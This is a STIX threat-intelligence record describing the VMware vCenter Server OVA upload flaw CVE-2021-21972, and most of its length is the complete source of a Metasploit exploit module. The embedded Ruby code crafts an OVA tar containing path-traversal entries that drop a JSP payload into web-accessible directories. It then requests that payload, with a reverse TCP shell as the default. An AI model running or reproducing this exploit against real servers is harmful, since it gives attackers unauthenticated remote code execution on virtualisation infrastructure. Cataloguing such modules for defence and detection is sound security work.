{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65ecf7e1-c181-485f-a5c5-7181950afd56",
    "created": "2024-08-14T17:07:59.194452Z",
    "modified": "2024-08-14T17:07:59.194456Z",
    "name": "VMware vCenter Server Unauthenticated OVA File Upload RCE",
    "description": " This module exploits an unauthenticated OVA file upload and path traversal in VMware vCenter Server to write a JSP payload to a web-accessible directory.  Fixed versions are 6.5 Update 3n, 6.7 Update 3l, and 7.0 Update 1c. Note that later vulnerable versions of the Linux appliance aren't exploitable via the webshell technique. Furthermore, writing an SSH public key to /home/vsphere-ui/.ssh/authorized_keys works, but the user's non-existent password expires 90 days after install, rendering the technique nearly useless against production environments.  You'll have the best luck targeting older versions of the Linux appliance. The Windows target should work ubiquitously. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vmware_vcenter_uploadova_rce.rb",
            "external_id": "vmware_vcenter_uploadova_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21972"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0002.html"
        },
        {
            "source_name": "reference",
            "url": "https://swarm.ptsecurity.com/unauth-rce-vmware/"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/jas502n/status/1364810720261496843"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/_0xf4n9x_/status/1364905040876503045"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/HackingLZ/status/1364636303606886403"
        },
        {
            "source_name": "reference",
            "url": "https://kb.vmware.com/s/article/2143838"
        },
        {
            "source_name": "reference",
            "url": "https://nmap.org/nsedoc/scripts/vmware-version.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  # \"Shotgun\" approach to writing JSP\n  Rank = ManualRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter Server Unauthenticated OVA File Upload RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated OVA file upload and path\n          traversal in VMware vCenter Server to write a JSP payload to a\n          web-accessible directory.\n\n          Fixed versions are 6.5 Update 3n, 6.7 Update 3l, and 7.0 Update 1c.\n          Note that later vulnerable versions of the Linux appliance aren't\n          exploitable via the webshell technique. Furthermore, writing an SSH\n          public key to /home/vsphere-ui/.ssh/authorized_keys works, but the\n          user's non-existent password expires 90 days after install, rendering\n          the technique nearly useless against production environments.\n\n          You'll have the best luck targeting older versions of the Linux\n          appliance. The Windows target should work ubiquitously.\n        },\n        'Author' => [\n          'Mikhail Klyuchnikov', # Discovery\n          'wvu', # Analysis and exploit\n          'mr_me', # Testing\n          'Viss' # Testing\n        ],\n        'References' => [\n          ['CVE', '2021-21972'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0002.html'],\n          ['URL', 'https://swarm.ptsecurity.com/unauth-rce-vmware/'],\n          ['URL', 'https://twitter.com/jas502n/status/1364810720261496843'],\n          ['URL', 'https://twitter.com/_0xf4n9x_/status/1364905040876503045'],\n          ['URL', 'https://twitter.com/HackingLZ/status/1364636303606886403'],\n          ['URL', 'https://kb.vmware.com/s/article/2143838'],\n          ['URL', 'https://nmap.org/nsedoc/scripts/vmware-version.html']\n        ],\n        'DisclosureDate' => '2021-02-23', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'win'],\n        'Arch' => ARCH_JAVA,\n        'Privileged' => false, # true on Windows\n        'Targets' => [\n          [\n            # TODO: /home/vsphere-ui/.ssh/authorized_keys\n            'VMware vCenter Server <= 6.7 Update 1b (Linux)',\n            {\n              'Platform' => 'linux'\n            }\n          ],\n          [\n            'VMware vCenter Server <= 6.7 Update 3j (Windows)',\n            {\n              'Platform' => 'win'\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'PAYLOAD' => 'java/jsp_shell_reverse_tcp',\n          'CheckModule' => 'auxiliary/scanner/vmware/esx_fingerprint'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],\n          'RelatedModules' => ['auxiliary/scanner/vmware/esx_fingerprint']\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n\n    register_advanced_options([\n      # /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/<index>\n      OptInt.new('SprayAndPrayMin', [true, 'Deployer index start', 40]), # mr_me\n      OptInt.new('SprayAndPrayMax', [true, 'Deployer index stop', 41]) # wvu\n    ])\n  end\n\n  def spray_and_pray_min\n    datastore['SprayAndPrayMin']\n  end\n\n  def spray_and_pray_max\n    datastore['SprayAndPrayMax']\n  end\n\n  def spray_and_pray_range\n    (spray_and_pray_min..spray_and_pray_max).to_a\n  end\n\n  def check\n    # Run auxiliary/scanner/vmware/esx_fingerprint\n    super\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/ui/vropspluginui/rest/services/getstatus')\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    case res.code\n    when 200\n      # {\"States\":\"[]\",\"Install Progress\":\"UNKNOWN\",\"Config Progress\":\"UNKNOWN\",\"Config Final Progress\":\"UNKNOWN\",\"Install Final Progress\":\"UNKNOWN\"}\n      expected_keys = [\n        'States',\n        'Install Progress',\n        'Install Final Progress',\n        'Config Progress',\n        'Config Final Progress'\n      ]\n\n      if (expected_keys & res.get_json_document.keys) == expected_keys\n        return CheckCode::Vulnerable('Unauthenticated endpoint access granted.')\n      end\n\n      CheckCode::Detected('Target did not respond with expected keys.')\n    when 401\n      CheckCode::Safe('Unauthenticated endpoint access denied.')\n    else\n      CheckCode::Detected(\"Target responded with code #{res.code}.\")\n    end\n  end\n\n  def exploit\n    upload_ova\n    pop_thy_shell # ;)\n  end\n\n  def upload_ova\n    print_status(\"Uploading OVA file: #{ova_filename}\")\n\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part(\n      generate_ova,\n      'application/x-tar', # OVA is tar\n      'binary',\n      %(form-data; name=\"uploadFile\"; filename=\"#{ova_filename}\")\n    )\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/ui/vropspluginui/rest/services/uploadova'),\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'data' => multipart_form.to_s\n    )\n\n    unless res && res.code == 200 && res.body == 'SUCCESS'\n      fail_with(Failure::NotVulnerable, 'Failed to upload OVA file')\n    end\n\n    register_files_for_cleanup(*jsp_paths)\n\n    print_good('Successfully uploaded OVA file')\n  end\n\n  def pop_thy_shell\n    jsp_uri =\n      case target['Platform']\n      when 'linux'\n        normalize_uri(target_uri.path, \"/ui/resources/#{jsp_filename}\")\n      when 'win'\n        normalize_uri(target_uri.path, \"/statsreport/#{jsp_filename}\")\n      end\n\n    print_status(\"Requesting JSP payload: #{full_uri(jsp_uri)}\")\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => jsp_uri\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::PayloadFailed, 'Failed to request JSP payload')\n    end\n\n    print_good('Successfully requested JSP payload')\n  end\n\n  def generate_ova\n    ova_file = StringIO.new\n\n    # HACK: Spray JSP in the OVA and pray we get a shell...\n    Rex::Tar::Writer.new(ova_file) do |tar|\n      jsp_paths.each do |path|\n        # /tmp/unicorn_ova_dir/../../<path>\n        tar.add_file(\"../..#{path}\", 0o644) { |jsp| jsp.write(payload.encoded) }\n      end\n    end\n\n    ova_file.string\n  end\n\n  def jsp_paths\n    case target['Platform']\n    when 'linux'\n      @jsp_paths ||= spray_and_pray_range.shuffle.map do |idx|\n        \"/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/#{idx}/0/h5ngc.war/resources/#{jsp_filename}\"\n      end\n    when 'win'\n      # Forward slashes work here\n      [\"/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/#{jsp_filename}\"]\n    end\n  end\n\n  def ova_filename\n    @ova_filename ||= \"#{rand_text_alphanumeric(8..42)}.ova\"\n  end\n\n  def jsp_filename\n    @jsp_filename ||= \"#{rand_text_alphanumeric(8..42)}.jsp\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-02-23, # Vendor advisory",
    "x_mitre_platforms": [
        "win"
    ]
}